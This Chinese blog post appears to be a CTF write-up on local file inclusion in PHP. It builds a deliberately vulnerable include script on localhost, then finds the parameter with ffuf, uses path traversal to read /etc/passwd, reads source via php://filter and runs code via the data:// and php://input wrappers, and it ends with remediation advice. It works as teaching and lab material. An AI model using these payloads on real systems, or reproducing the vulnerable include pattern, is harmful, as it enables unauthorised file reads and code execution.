---
title: "参数爆破与 PHP 伪协议利用"
slug: "param-fuzz-php-wrapper"
date: 2026-08-28T20:11:43+08:00
lastmod: 2026-10-27T11:30:00+08:00
draft: false
author: ["xuanwo"]
description: "moeCTF 2025 Web 第十一题：参数爆破配合 php://filter 读取源码。"
summary: "moeCTF 2025 Web 第十一题：参数爆破配合 php://filter 读取源码。"
tags: ["PHP", "参数爆破", "php://filter"]
categories: ["Web 安全"]
series: ["Web 安全笔记"]
weight: 2
ShowToc: true
TocOpen: false
hidemeta: false
comments: false
showReadingTime: true
ShowBreadCrumbs: true
ShowPostNavLinks: true
ShowCodeCopyButtons: true
source_repo: "https://github.com/xuanwoLQL/security-notes/blob/main/web-security/2.参数爆破+PHP伪协议的利用.md"
---

## 复现流程图

<figure class="note-diagram">
  <img src="/images/notes/param-fuzz-php-wrapper/workflow.svg" alt="先找到真正进入 include 的参数，再用 PHP 包装器读取源码。" loading="lazy">
  <figcaption>图 1 · 参数发现与伪协议利用。先找到真正进入 include 的参数，再用 PHP 包装器读取源码。</figcaption>
</figure>

## 1. 本地 LFI 环境

创建 `/tmp/php-lfi/index.php`：

```php
<?php
$page = $_GET['page'] ?? 'home.php';
include $page;
```

创建 `home.php`：

```php
<h1>home</h1>
```

创建 `secret.php`：

```php
<?php
$secret = 'flag{php_wrapper_demo}';
```

启动：

```bash
cd /tmp/php-lfi
php -S 127.0.0.1:8080
```

## 2. 发现参数

从 URL、源码或 JS bundle 中找候选参数名：

```text
page file path view template include module
```

用 ffuf 对参数名做小字典测试：

```bash
ffuf -u 'http://127.0.0.1:8080/?FUZZ=home.php' \
  -w /path/to/SecLists/Discovery/Web-Content/burp-parameter-names.txt \
  -mc all -fs 0
```

确认 `page` 改变页面内容后，记录基线：

```bash
curl -sS 'http://127.0.0.1:8080/?page=home.php'
```

## 3. 路径遍历

```bash
curl -sS --get --data-urlencode 'page=../../../../etc/passwd' \
  'http://127.0.0.1:8080/'
```

## 4. php://filter 读源码

```bash
curl -sS --get \
  --data-urlencode 'page=php://filter/read=convert.base64-encode/resource=secret.php' \
  'http://127.0.0.1:8080/' \
  -o /tmp/secret.b64

base64 -d /tmp/secret.b64
```

## 5. 其他包装器

如果 `allow_url_include=On`：

```bash
curl -sS --get \
  --data-urlencode 'page=data://text/plain,<?php phpinfo();?>' \
  'http://127.0.0.1:8080/'
```

`php://input`：

```bash
curl -sS -X POST \
  --data '<?php echo "input-wrapper"; ?>' \
  'http://127.0.0.1:8080/?page=php://input'
```

`phar://` 用于触发 phar 元数据反序列化，需要存在可控 phar 文件。

## 6. 排错

| 现象 | 原因 | 处理 |
| --- | --- | --- |
| 参数名全无响应 | 参数不在 Query | 测 POST / JSON / Cookie |
| `include` 报路径不存在 | 相对路径基准不同 | 用 `phpinfo` 或错误日志确认 |
| filter 输出为空 | `include` 与 `read` 冲突 | 用 `read=` 或 `resource=` |
| data wrapper 不执行 | `allow_url_include=Off` | 改测日志/文件写入 |

## 7. 修复

- include 白名单；
- `realpath` 后限制在项目根目录；
- 禁止 `php://`、`data://`、`phar://`；
- 关闭 `allow_url_include`；
- 不给 Web 用户写日志/临时文件的权限。
